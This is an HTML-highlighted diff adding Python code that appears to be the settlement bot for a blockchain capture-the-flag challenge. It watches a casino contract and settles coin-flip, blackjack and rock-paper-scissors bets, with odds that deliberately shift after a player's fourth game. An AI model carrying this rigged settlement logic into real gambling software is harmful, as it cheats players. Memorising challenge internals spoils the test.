+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">addr</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;0x&#34;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">addr</span> <span class="o">=</span> <span class="s2">&#34;0x&#34;</span> <span class="o">+</span> <span class="n">addr</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">42</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;invalid length&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">Web3</span><span class="o">.</span><span class="n">toChecksumAddress</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">Web3</span><span class="o">.</span><span class="n">toChecksumAddress</span><span class="p">(</span><span class="n">addr</span><span class="o">.</span><span class="n">lower</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">setup_addr</span> <span class="o">=</span> <span class="n">normalize_address</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">setup_contract</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">logging</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="s2">&#34;Invalid setup_contract address </span><span class="si">%s</span><span class="s2">: </span><span class="si">%s</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">setup_contract</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">setup_contract</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">contract</span><span class="p">(</span><span class="n">address</span><span class="o">=</span><span class="n">setup_addr</span><span class="p">,</span> <span class="n">abi</span><span class="o">=</span><span class="n">SETUP_ABI</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">chal_addr_raw</span> <span class="o">=</span> <span class="n">setup_contract</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">TARGET</span><span class="p">()</span><span class="o">.</span><span class="n">call</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">chal_addr</span> <span class="o">=</span> <span class="n">Web3</span><span class="o">.</span><span class="n">toChecksumAddress</span><span class="p">(</span><span class="n">chal_addr_raw</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">logging</span><span class="o">.</span><span class="n">exception</span><span class="p">(</span><span class="s2">&#34;Failed to read TARGET() from Setup contract </span><span class="si">%s</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">setup_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">contract</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">contract</span><span class="p">(</span><span class="n">address</span><span class="o">=</span><span class="n">chal_addr</span><span class="p">,</span> <span class="n">abi</span><span class="o">=</span><span class="n">ABI</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Service </span><span class="si">%s</span><span class="s2"> running. Owner address: </span><span class="si">%s</span><span class="s2">. Watching Chal contract: </span><span class="si">%s</span><span class="s2"> (setup: </span><span class="si">%s</span><span class="s2">)&#34;</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">uuid</span><span class="p">,</span> <span class="n">acct</span><span class="o">.</span><span class="n">address</span><span class="p">,</span> <span class="n">chal_addr</span><span class="p">,</span> <span class="n">setup_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># scanning loop: periodically query nextBetId and inspect each bet for unsettled state</span>
+</span></span><span class="line"><span class="cl">    <span class="n">scan_interval</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">total</span> <span class="o">=</span> <span class="n">contract</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">nextBetId</span><span class="p">()</span><span class="o">.</span><span class="n">call</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">total</span> <span class="ow">and</span> <span class="n">total</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="c1"># iterate all placed bets (1 .. nextBetId-1)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="n">bid</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">total</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">player</span><span class="p">,</span> <span class="n">machine</span><span class="p">,</span> <span class="n">games</span><span class="p">,</span> <span class="n">amount</span><span class="p">,</span> <span class="n">settled</span><span class="p">,</span> <span class="n">won</span> <span class="o">=</span> <span class="n">contract</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">getBet</span><span class="p">(</span><span class="n">bid</span><span class="p">)</span><span class="o">.</span><span class="n">call</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">logging</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">&#34;Failed to read bet </span><span class="si">%s</span><span class="s2">: </span><span class="si">%s</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">bid</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                    <span class="c1"># skip empty / non-existent</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="n">player</span> <span class="o">==</span> <span class="s2">&#34;0x0000000000000000000000000000000000000000&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="ow">not</span> <span class="n">settled</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="n">machine</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                            <span class="c1"># resolve it</span>
+</span></span><span class="line"><span class="cl">                            <span class="k">if</span> <span class="n">games</span> <span class="o">&gt;</span> <span class="mi">3</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                <span class="k">if</span> <span class="n">secure_randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">40</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                    <span class="n">r</span> <span class="o">=</span> <span class="n">secure_randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                    <span class="n">r</span> <span class="o">=</span> <span class="n">secure_randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">-</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">                            <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">r</span> <span class="o">=</span> <span class="n">secure_randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span>   <span class="c1">#check this</span>
+</span></span><span class="line"><span class="cl">                            <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Resolving bet </span><span class="si">%s</span><span class="s2"> (player=</span><span class="si">%s</span><span class="s2"> amount=</span><span class="si">%s</span><span class="s2"> wei) =&gt; outcome=</span><span class="si">%s</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">bid</span><span class="p">,</span> <span class="n">player</span><span class="p">,</span> <span class="n">amount</span><span class="p">,</span> <span class="n">r</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                            <span class="n">tx_func</span> <span class="o">=</span> <span class="n">contract</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">settleCoinFlip</span><span class="p">(</span><span class="n">bid</span><span class="p">,</span> <span class="n">r</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                            <span class="n">nonce</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">getTransactionCount</span><span class="p">(</span><span class="n">acct</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                            <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">gas_est</span> <span class="o">=</span> <span class="n">tx_func</span><span class="o">.</span><span class="n">estimateGas</span><span class="p">({</span><span class="s2">&#34;from&#34;</span><span class="p">:</span> <span class="n">acct</span><span class="o">.</span><span class="n">address</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">                            <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">gas_est</span> <span class="o">=</span> <span class="mi">200_000</span>
+</span></span><span class="line"><span class="cl">                            <span class="n">tx</span> <span class="o">=</span> <span class="n">tx_func</span><span class="o">.</span><span class="n">buildTransaction</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                                <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                                    <span class="s2">&#34;from&#34;</span><span class="p">:</span> <span class="n">acct</span><span class="o">.</span><span class="n">address</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                    <span class="s2">&#34;nonce&#34;</span><span class="p">:</span> <span class="n">nonce</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                    <span class="s2">&#34;gas&#34;</span><span class="p">:</span> <span class="nb">int</span><span class="p">(</span><span class="n">gas_est</span> <span class="o">*</span> <span class="mf">1.2</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                                    <span class="s2">&#34;gasPrice&#34;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">gas_price</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                    <span class="s2">&#34;chainId&#34;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">chain_id</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                            <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                            <span class="n">signed</span> <span class="o">=</span> <span class="n">acct</span><span class="o">.</span><span class="n">signTransaction</span><span class="p">(</span><span class="n">tx</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                            <span class="n">tx_hash</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">sendRawTransaction</span><span class="p">(</span><span class="n">signed</span><span class="o">.</span><span class="n">rawTransaction</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                            <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Submitted settle tx </span><span class="si">%s</span><span class="s2"> for bet </span><span class="si">%s</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">tx_hash</span><span class="o">.</span><span class="n">hex</span><span class="p">(),</span> <span class="n">bid</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                            <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">receipt</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">waitForTransactionReceipt</span><span class="p">(</span><span class="n">tx_hash</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">30</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Tx mined: </span><span class="si">%s</span><span class="s2"> status=</span><span class="si">%s</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">tx_hash</span><span class="o">.</span><span class="n">hex</span><span class="p">(),</span> <span class="n">receipt</span><span class="o">.</span><span class="n">status</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                            <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">logging</span><span class="o">.</span><span class="n">warning</span><span class="p">(</span><span class="s2">&#34;Waiting for receipt failed: </span><span class="si">%s</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                        <span class="k">elif</span> <span class="n">machine</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                            <span class="c1"># resolve it</span>
+</span></span><span class="line"><span class="cl">                            <span class="k">if</span> <span class="n">games</span> <span class="o">&gt;</span> <span class="mi">3</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                <span class="k">if</span> <span class="n">secure_randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">30</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                    <span class="n">r</span> <span class="o">=</span> <span class="n">secure_randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">42</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                    <span class="n">r</span> <span class="o">=</span> <span class="n">secure_randint</span><span class="p">(</span><span class="mi">22</span><span class="p">,</span> <span class="mi">42</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                            <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                <span class="k">if</span> <span class="n">secure_randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">50</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                    <span class="n">r</span> <span class="o">=</span> <span class="n">secure_randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">21</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                    <span class="n">r</span> <span class="o">=</span> <span class="mi">21</span>
+</span></span><span class="line"><span class="cl">                            <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Resolving bet </span><span class="si">%s</span><span class="s2"> (player=</span><span class="si">%s</span><span class="s2"> amount=</span><span class="si">%s</span><span class="s2"> wei) =&gt; outcome=</span><span class="si">%s</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">bid</span><span class="p">,</span> <span class="n">player</span><span class="p">,</span> <span class="n">amount</span><span class="p">,</span> <span class="n">r</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                            <span class="n">tx_func</span> <span class="o">=</span> <span class="n">contract</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">settleBlackJack</span><span class="p">(</span><span class="n">bid</span><span class="p">,</span> <span class="n">r</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                            <span class="n">nonce</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">getTransactionCount</span><span class="p">(</span><span class="n">acct</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                            <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">gas_est</span> <span class="o">=</span> <span class="n">tx_func</span><span class="o">.</span><span class="n">estimateGas</span><span class="p">({</span><span class="s2">&#34;from&#34;</span><span class="p">:</span> <span class="n">acct</span><span class="o">.</span><span class="n">address</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">                            <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">gas_est</span> <span class="o">=</span> <span class="mi">200_000</span>
+</span></span><span class="line"><span class="cl">                            <span class="n">tx</span> <span class="o">=</span> <span class="n">tx_func</span><span class="o">.</span><span class="n">buildTransaction</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                                <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                                    <span class="s2">&#34;from&#34;</span><span class="p">:</span> <span class="n">acct</span><span class="o">.</span><span class="n">address</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                    <span class="s2">&#34;nonce&#34;</span><span class="p">:</span> <span class="n">nonce</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                    <span class="s2">&#34;gas&#34;</span><span class="p">:</span> <span class="nb">int</span><span class="p">(</span><span class="n">gas_est</span> <span class="o">*</span> <span class="mf">1.2</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                                    <span class="s2">&#34;gasPrice&#34;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">gas_price</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                    <span class="s2">&#34;chainId&#34;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">chain_id</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                            <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                            <span class="n">signed</span> <span class="o">=</span> <span class="n">acct</span><span class="o">.</span><span class="n">signTransaction</span><span class="p">(</span><span class="n">tx</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                            <span class="n">tx_hash</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">sendRawTransaction</span><span class="p">(</span><span class="n">signed</span><span class="o">.</span><span class="n">rawTransaction</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                            <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Submitted settle tx </span><span class="si">%s</span><span class="s2"> for bet </span><span class="si">%s</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">tx_hash</span><span class="o">.</span><span class="n">hex</span><span class="p">(),</span> <span class="n">bid</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                            <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">receipt</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">waitForTransactionReceipt</span><span class="p">(</span><span class="n">tx_hash</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">30</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Tx mined: </span><span class="si">%s</span><span class="s2"> status=</span><span class="si">%s</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">tx_hash</span><span class="o">.</span><span class="n">hex</span><span class="p">(),</span> <span class="n">receipt</span><span class="o">.</span><span class="n">status</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                            <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">logging</span><span class="o">.</span><span class="n">warning</span><span class="p">(</span><span class="s2">&#34;Waiting for receipt failed: </span><span class="si">%s</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                        <span class="k">elif</span> <span class="n">machine</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                            <span class="c1"># resolve it</span>
+</span></span><span class="line"><span class="cl">                            <span class="k">if</span> <span class="n">games</span> <span class="o">&gt;</span> <span class="mi">3</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                <span class="k">if</span> <span class="n">secure_randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">50</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                    <span class="n">r</span> <span class="o">=</span> <span class="n">secure_randint</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                    <span class="n">r</span> <span class="o">=</span> <span class="n">secure_randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                            <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                <span class="k">if</span> <span class="n">secure_randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">50</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                    <span class="n">r</span> <span class="o">=</span> <span class="n">secure_randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                    <span class="n">r</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">                            <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Resolving bet </span><span class="si">%s</span><span class="s2"> (player=</span><span class="si">%s</span><span class="s2"> amount=</span><span class="si">%s</span><span class="s2"> wei) =&gt; outcome=</span><span class="si">%s</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">bid</span><span class="p">,</span> <span class="n">player</span><span class="p">,</span> <span class="n">amount</span><span class="p">,</span> <span class="n">r</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                            <span class="n">tx_func</span> <span class="o">=</span> <span class="n">contract</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">settleRockPaperScissors</span><span class="p">(</span><span class="n">bid</span><span class="p">,</span> <span class="n">r</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                            <span class="n">nonce</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">getTransactionCount</span><span class="p">(</span><span class="n">acct</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                            <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">gas_est</span> <span class="o">=</span> <span class="n">tx_func</span><span class="o">.</span><span class="n">estimateGas</span><span class="p">({</span><span class="s2">&#34;from&#34;</span><span class="p">:</span> <span class="n">acct</span><span class="o">.</span><span class="n">address</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">                            <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">gas_est</span> <span class="o">=</span> <span class="mi">200_000</span>
+</span></span><span class="line"><span class="cl">                            <span class="n">tx</span> <span class="o">=</span> <span class="n">tx_func</span><span class="o">.</span><span class="n">buildTransaction</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                                <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                                    <span class="s2">&#34;from&#34;</span><span class="p">:</span> <span class="n">acct</span><span class="o">.</span><span class="n">address</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                    <span class="s2">&#34;nonce&#34;</span><span class="p">:</span> <span class="n">nonce</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                    <span class="s2">&#34;gas&#34;</span><span class="p">:</span> <span class="nb">int</span><span class="p">(</span><span class="n">gas_est</span> <span class="o">*</span> <span class="mf">1.2</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                                    <span class="s2">&#34;gasPrice&#34;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">gas_price</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                    <span class="s2">&#34;chainId&#34;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">chain_id</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                            <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                            <span class="n">signed</span> <span class="o">=</span> <span class="n">acct</span><span class="o">.</span><span class="n">signTransaction</span><span class="p">(</span><span class="n">tx</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                            <span class="n">tx_hash</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">sendRawTransaction</span><span class="p">(</span><span class="n">signed</span><span class="o">.</span><span class="n">rawTransaction</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                            <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Submitted settle tx </span><span class="si">%s</span><span class="s2"> for bet </span><span class="si">%s</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">tx_hash</span><span class="o">.</span><span class="n">hex</span><span class="p">(),</span> <span class="n">bid</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                            <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">receipt</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">waitForTransactionReceipt</span><span class="p">(</span><span class="n">tx_hash</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">30</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Tx mined: </span><span class="si">%s</span><span class="s2"> status=</span><span class="si">%s</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">tx_hash</span><span class="o">.</span><span class="n">hex</span><span class="p">(),</span> <span class="n">receipt</span><span class="o">.</span><span class="n">status</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                            <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">logging</span><span class="o">.</span><span class="n">warning</span><span class="p">(</span><span class="s2">&#34;Waiting for receipt failed: </span><span class="si">%s</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">scan_interval</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Shutting down (keyboard interrupt)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
